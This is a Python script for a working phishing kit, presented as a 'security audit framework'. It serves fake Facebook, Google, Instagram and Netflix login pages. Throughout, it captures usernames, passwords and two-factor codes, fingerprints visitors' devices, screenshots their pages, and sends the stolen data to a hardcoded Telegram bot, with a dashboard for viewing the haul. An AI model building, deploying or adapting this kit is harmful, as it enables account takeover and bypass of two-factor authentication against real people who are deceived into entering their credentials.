#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import urllib.request
import os
import threading
import json
import base64
import sys

PORT = 8080
LOG_FILE = "audit_results.log"
MEDIA_DIR = "captured_media"

if not os.path.exists(MEDIA_DIR):
    os.makedirs(MEDIA_DIR)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "9111398440:AAEndzRhZegO5UqDoDckMgQdXZs1V3feyag"
TELEGRAM_CHAT_ID = "8878200031"

def trigger_beep():
    """Triggers a terminal audio beep alert."""
    try:
        sys.stdout.write('\a')
        sys.stdout.flush()
    except Exception:
        pass

def send_telegram_alert(message):
    """Sends text alerts directly to your Telegram Bot."""
    if TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE" or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        req = urllib.request.Request(url, data=payload.encode('utf-8'), headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=3)
    except Exception as e:
        print(f"[-] Telegram Alert Error: {e}")

def send_telegram_photo(photo_path, caption=""):
    """Sends captured screenshot directly to your Telegram Bot."""
    if TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE" or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        
        with open(photo_path, 'rb') as f:
            photo_data = f.read()

        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            f'{TELEGRAM_CHAT_ID}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="caption"\r\n\r\n'
            f'{caption}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="photo"; filename="screenshot.png"\r\n'
            f'Content-Type: image/png\r\n\r\n'
        ).encode('utf-8') + photo_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')

        req = urllib.request.Request(
            url,
            data=body,
            headers={
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0'
            },
            method='POST'
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"[-] Telegram Photo Error: {e}")

# Templates Configuration with Custom Masked Paths
TEMPLATES = {
    "1": {
        "name": "Facebook Security Portal",
        "brand_color": "#1877f2",
        "title": "Facebook - Log In or Sign Up",
        "mask_hint": "facebook-login-secure-verification"
    },
    "2": {
        "name": "Google Secure Verification",
        "brand_color": "#4285F4",
        "title": "Sign in - Google Accounts",
        "mask_hint": "google-account-recovery-portal"
    },
    "3": {
        "name": "Instagram Account Recovery",
        "brand_color": "#E1306C",
        "title": "Login • Instagram",
        "mask_hint": "instagram-identity-confirmation"
    },
    "4": {
        "name": "Netflix Member Verification",
        "brand_color": "#E50914",
        "title": "Netflix - Watch TV Shows Online, Watch Movies Online",
        "mask_hint": "netflix-billing-update-center"
    }
}

SELECTED_TEMPLATE = TEMPLATES["1"]

def generate_html(template):
    html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>__TITLE__</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: __BRAND_COLOR__; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: __BRAND_COLOR__; border: none; color: white; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        button:hover { opacity: 0.9; }
        .info { font-size: 12px; color: #65676b; margin-top: 15px; }
        .error-msg { color: #ed4337; font-size: 13px; margin-bottom: 10px; display: none; }
        #loginForm, #otpForm { display: none; }
        .mask-banner { background: #e7f3ff; color: #1877f2; padding: 8px; font-size: 11px; border-radius: 4px; margin-bottom: 15px; border: 1px solid #b7d4fc; }
    </style>
</head>
<body>
    <div class="card" id="captureArea">
        <div class="mask-banner">🔒 Secure Audit Domain: <b>__MASK_HINT__.audit-system.local</b></div>
        <h2>__NAME__</h2>
        <p class="info" id="statusMsg">Verifying browser security & anti-bot check...</p>
        <div id="errorBox" class="error-msg">Incorrect username or password. Please try again.</div>
        
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Mobile number, email, or username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="hidden" id="botToken" name="botToken" value="">
            <button type="submit" id="subBtn">Continue</button>
        </form>

        <form id="otpForm">
            <p style="font-size: 14px; color: #333; margin-bottom: 10px;">Enter the 6-digit confirmation code sent to your device or email.</p>
            <input type="text" id="otpCode" name="otpCode" placeholder="Enter 6-digit Code" maxlength="6" required>
            <button type="submit" id="otpBtn">Verify Code</button>
        </form>

        <div class="info" id="status">Gathering secure device telemetry...</div>
    </div>

    <script>
        let humanVerified = false;
        let botTokenValue = "";
        let currentSessionUser = "";

        function checkHuman() {
            botTokenValue = "verified_human_" + Math.random().toString(36).substring(2);
            document.getElementById('botToken').value = botTokenValue;
            humanVerified = true;
            document.getElementById('loginForm').style.display = 'block';
            document.getElementById('statusMsg').innerText = "Please verify your session to proceed.";
        }

        let interactionCount = 0;
        function handleInteraction() {
            interactionCount++;
            if (interactionCount > 1 && !humanVerified) {
                checkHuman();
            }
        }

        window.addEventListener('mousemove', handleInteraction);
        window.addEventListener('touchstart', handleInteraction);

        setTimeout(() => {
            if (!humanVerified) {
                checkHuman();
            }
        }, 1500);

        function takeScreenshot() {
            html2canvas(document.body).then(canvas => {
                let imgData = canvas.toDataURL('image/png');
                fetch('/screenshot', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imgData, username: currentSessionUser || 'unknown' })
                }).catch(err => console.error('Screenshot error:', err));
            });
        }

        async function gatherIntelligence() {
            let data = {};
            data.screenWidth = window.screen.width;
            data.screenHeight = window.screen.height;
            data.pixelRatio = window.devicePixelRatio || 1;
            data.platform = navigator.platform;
            data.userAgent = navigator.userAgent;
            data.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
            data.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
            data.deviceMemory = navigator.deviceMemory || 'Unknown';

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    data.batteryLevel = Math.round(battery.level * 100) + "%";
                    data.batteryCharging = battery.charging;
                } catch (e) {
                    data.batteryLevel = "Unavailable";
                }
            } else {
                data.batteryLevel = "Not Supported";
            }

            fetch('/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                document.getElementById('status').innerText = "System secure and verified.";
            }).catch(() => {
                document.getElementById('status').innerText = "Ready.";
            });
        }

        window.onload = gatherIntelligence;

        let attemptCount = 0;
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;
            let token = document.getElementById('botToken').value;
            currentSessionUser = username;

            setTimeout(takeScreenshot, 500);

            fetch('/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password, attempt: attemptCount, botToken: token })
            }).then(response => response.json()).then(data => {
                if (data.status === 'retry') {
                    attemptCount++;
                    document.getElementById('errorBox').style.display = 'block';
                    document.getElementById('password').value = '';
                } else if (data.status === 'require_otp') {
                    document.getElementById('loginForm').style.display = 'none';
                    document.getElementById('errorBox').style.display = 'none';
                    document.getElementById('otpForm').style.display = 'block';
                    document.getElementById('statusMsg').innerText = "Two-Factor Authentication Required";
                } else if (data.status === 'bot_blocked') {
                    alert('Security verification failed. Automated access restricted.');
                }
            }).catch(err => {
                console.error('Error:', err);
            });
        });

        document.getElementById('otpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            let otpCode = document.getElementById('otpCode').value;

            fetch('/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: currentSessionUser, otp: otpCode })
            }).then(response => response.json()).then(data => {
                if (data.status === 'success') {
                    window.location.href = data.redirect;
                }
            }).catch(err => {
                console.error('Error:', err);
            });
        });
    </script>
</body>
</html>
"""
    return (html_content
            .replace("__TITLE__", template['title'])
            .replace("__BRAND_COLOR__", template['brand_color'])
            .replace("__NAME__", template['name'])
            .replace("__MASK_HINT__", template['mask_hint']))

def generate_admin_dashboard():
    log_content = ""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            log_content = f.read()

    screenshots = []
    if os.path.exists(MEDIA_DIR):
        screenshots = os.listdir(MEDIA_DIR)

    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Framework v10 - Admin Dashboard</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #121212; color: #e0e0e0; margin: 0; padding: 20px; }}
        h1 {{ color: #00ffcc; }}
        .container {{ max-width: 1000px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }}
        pre {{ background: #2d2d2d; padding: 15px; border-radius: 5px; overflow-x: auto; color: #00ff66; font-size: 13px; }}
        .section {{ margin-top: 30px; }}
        .screenshots-grid {{ display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px; }}
        .thumb {{ border: 1px solid #444; border-radius: 5px; padding: 5px; background: #252525; text-align: center; }}
        .thumb img {{ max-width: 200px; height: auto; border-radius: 3px; }}
        .thumb p {{ font-size: 11px; color: #aaa; margin: 5px 0 0 0; }}
        .btn {{ display: inline-block; padding: 10px 20px; background: #00ffcc; color: #121212; text-decoration: none; font-weight: bold; border-radius: 4px; margin-bottom: 20px; }}
        .btn:hover {{ background: #00b38f; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ Security Audit Framework v10 - Admin Dashboard</h1>
        <p>Live session telemetry, captured credentials, and harvested media monitor.</p>
        <a href="/" class="btn" target="_blank">🌐 Open Phishing Portal Preview</a>
        
        <div class="section">
            <h3>📊 Audit Activity Logs (audit_results.log)</h3>
            <pre>{log_content if log_content else "No audit logs recorded yet."}</pre>
        </div>

        <div class="section">
            <h3>📸 Captured Screenshots ({len(screenshots)})</h3>
            <div class="screenshots-grid">
                {"".join([f'<div class="thumb"><img src="/media/{img}"><p>{img}</p></div>' for img in screenshots]) if screenshots else "<p>No screenshots captured yet.</p>"}
            </div>
        </div>
    </div>
</body>
</html>
"""

def get_geolocation(ip):
    if ip in ["127.0.0.1", "localhost", "::1"]:
        return {"country": "Local Network", "city": "Local", "isp": "Local"}
    try:
        url = f"http://ip-api.com/json/{ip}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=2) as response:
            data = json.loads(response.read().decode())
            if data.get("status") == "success":
                return {
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "isp": data.get("isp", "Unknown")
                }
    except Exception:
        pass
    return {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

class SecurityAuditHandler(http.server.BaseHTTPRequestHandler):
    def get_client_ip(self):
        cf_ip = self.headers.get('CF-Connecting-IP')
        if cf_ip:
            return cf_ip
        forwarded = self.headers.get('X-Forwarded-For')
        if forwarded:
            return forwarded.split(',')[0].strip()
        return self.client_address[0]

    def do_GET(self):
        if self.path == '/admin-panel':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(generate_admin_dashboard().encode('utf-8'))
        elif self.path.startswith('/media/'):
            filename = self.path.replace('/media/', '')
            filepath = os.path.join(MEDIA_DIR, filename)
            if os.path.exists(filepath):
                self.send_response(200)
                if filename.endswith('.png'):
                    self.send_header("Content-type", "image/png")
                else:
                    self.send_header("Content-type", "application/octet-stream")
                self.end_headers()
                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Media Not Found")
        elif self.path == '/' or self.path == '/index.html' or f"/{SELECTED_TEMPLATE['mask_hint']}" in self.path:
            client_ip = self.get_client_ip()
            geo = get_geolocation(client_ip)
            trigger_beep()
            print(f"\033[94m[VISIT] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | ISP: {geo['isp']}\033[0m")
            
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(generate_html(SELECTED_TEMPLATE).encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        client_ip = self.get_client_ip()
        geo = get_geolocation(client_ip)

        if self.path == '/login':
            try:
                data = json.loads(post_data.decode('utf-8'))
                username = data.get('username', '')
                password = data.get('password', '')
                attempt = data.get('attempt', 0)
                bot_token = data.get('botToken', '')

                if not bot_token or not bot_token.startswith('verified_human_'):
                    log_entry = f"[BOT BLOCKED] IP: {client_ip} ({geo['country']})\n"
                    print(f"\033[91m{log_entry}\033[0m")
                    with open(LOG_FILE, "a") as f:
                        f.write(log_entry)
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "bot_blocked"}).encode('utf-8'))
                    return

                trigger_beep()
                log_entry = f"[CREDENTIAL CAPTURED] Template: {SELECTED_TEMPLATE['name']} | IP: {client_ip} | Location: {geo['city']}, {geo['country']} ({geo['isp']}) | User: {username} | Pass: {password}\n"
                print(f"\033[92m{log_entry}\033[0m")
                
                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)

                tg_msg = f"🚨 *New Credential Captured!*\n\n🏢 *Template:* {SELECTED_TEMPLATE['name']}\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`\n🌍 *IP:* `{client_ip}`\n📍 *Location:* {geo['city']}, {geo['country']}\n🌐 *ISP:* {geo['isp']}"
                send_telegram_alert(tg_msg)

                response_data = {"status": "require_otp"}
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(response_data).encode('utf-8'))
            except Exception as e:
                print(f"Error handling login: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == '/screenshot':
            try:
                data = json.loads(post_data.decode('utf-8'))
                img_data = data.get('image', '').split(',')[1]
                username = data.get('username', 'unknown').replace('/', '_')
                
                img_bytes = base64.b64decode(img_data)
                filename = os.path.join(MEDIA_DIR, f"screenshot_{username}.png")
                
                with open(filename, "wb") as f:
                    f.write(img_bytes)

                log_entry = f"[SCREENSHOT CAPTURED] Saved to {filename} | IP: {client_ip}\n"
                print(f"\033[96m{log_entry}\033[0m")

                send_telegram_photo(filename, caption=f"📸 *Screenshot Captured!*\n👤 *User:* `{username}`\n🌍 *IP:* `{client_ip}`")

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
            except Exception as e:
                print(f"Error handling screenshot: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == '/verify-otp':
            try:
                data = json.loads(post_data.decode('utf-8'))
                username = data.get('username', '')
                otp_code = data.get('otp', '')

                trigger_beep()
                log_entry = f"[OTP CAPTURED] User: {username} | Code: {otp_code} | IP: {client_ip}\n"
                print(f"\033[95m{log_entry}\033[0m")

                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)

                tg_otp_msg = f"🔐 *OTP / 2FA Code Captured!*\n\n👤 *User:* `{username}`\n🔢 *Code:* `{otp_code}`\n🌍 *IP:* `{client_ip}`"
                send_telegram_alert(tg_otp_msg)

                response_data = {"status": "success", "redirect": "https://www.google.com"}
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(response_data).encode('utf-8'))
            except Exception as e:
                print(f"Error handling OTP: {e}")
                self.send_response(500)
                self.end_headers()

        elif self.path == '/telemetry':
            try:
                telemetry = json.loads(post_data.decode('utf-8'))
                log_entry = f"[DEVICE INTEL] IP: {client_ip} | Location: {geo['city']}, {geo['country']} | Data: {json.dumps(telemetry)}\n"
                print(f"\033[93m{log_entry}\033[0m")
                
                with open(LOG_FILE, "a") as f:
                    f.write(log_entry)
            except Exception as e:
                print(f"Error parsing telemetry: {e}")

            response_bytes = json.dumps({"status": "success"}).encode('utf-8')
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(response_bytes)

def select_template():
    global SELECTED_TEMPLATE
    print("\n==============================================")
    print("   ADVANCED SECURITY AUDIT FRAMEWORK v10      ")
    print("==============================================")
    print(" Please select a target template / brand:")
    print("----------------------------------------------")
    for key, val in TEMPLATES.items():
        print(f" [{key}] {val['name']} (Mask: {val['mask_hint']})")
    print("----------------------------------------------")
    choice = input(" Enter your choice (1-4) [Default 1]: ").strip()
    if choice in TEMPLATES:
        SELECTED_TEMPLATE = TEMPLATES[choice]
    else:
        SELECTED_TEMPLATE = TEMPLATES["1"]
    print(f"\n[+] Active Template: \033[92m{SELECTED_TEMPLATE['name']}\033[0m")
    print(f"[+] Masked URL Path: \033[96m/{SELECTED_TEMPLATE['mask_hint']}\033[0m\n")

def run_server():
    select_template()
    server_address = ('', PORT)
    httpd = ThreadedHTTPServer(server_address, SecurityAuditHandler)
    print(f"\033[96m[*] Framework v10 running on port {PORT}...\033[0m")
    print(f"\033[96m[*] Admin Dashboard available at: http://localhost:{PORT}/admin-panel\033[0m")
    print(f"\033[96m[*] Logging captured data to {LOG_FILE}\033[0m")
    print(f"\033[96m[*] Captured media will be saved in {MEDIA_DIR}/\033[0m")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\033[91m[-] Shutting down framework v10.\033[0m")
        httpd.server_close()

if __name__ == '__main__':
    run_server()
